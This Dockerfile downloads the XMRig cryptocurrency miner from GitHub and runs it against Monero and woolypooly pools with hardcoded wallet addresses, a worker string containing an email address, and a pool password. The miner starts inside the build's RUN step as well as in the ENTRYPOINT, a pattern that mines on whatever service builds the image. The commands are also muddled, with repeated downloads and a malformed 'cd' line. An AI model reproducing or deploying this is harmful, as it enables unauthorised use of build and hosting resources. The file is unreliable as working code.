FROM alpine:latest

# Set the working directory to /app
WORKDIR /app

# Install dependencies and download the miner
RUN apk --no-cache add curl tar && \
    curl -O -L https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-static-x64.tar.gz && \
    tar -xvf xmrig-6.16.4-linux-static-x64.tar.gz && \
    rm xmrig-6.16.4-linux-static-x64.tar.gz && \
    cd xmrig-6.16.4 xmrig && wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-static-x64.tar.gz && tar -xvf xmrig-6.16.4-linux-static-x64.tar.gz && cd xmrig-6.16.4 && ./xmrig -o stratum+ssl://xmr-asia1.nanopool.org:14433 -u 496AJjjf5RTKZ9RgGa1DG6VnGL1BBWTCb7zgLrjbPD2JSbFCTSgANdTgvtuA9gttagW1mY45ANbNW4vh5jveGe4WUTrtbvL.web/yulramlan@gmail.com -p sianjing --tls --coin monero

# Set the entrypoint command to start the miner with the provided parameters
ENTRYPOINT ["/bin/sh", "-c", "wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-static-x64.tar.gz && tar -xvf xmrig-6.16.4-linux-static-x64.tar.gz && rm xmrig-6.16.4-linux-static-x64.tar.gz && cd xmrig-6.16.4 && ./xmrig -a gr -o stratum+tcp://pool.${REGION}.woolypooly.com:3110 -u RHfCA1awKJ9E8F7nQuy3zT5PnxNkRc1Rkk.${RIGNAME} -p x"]
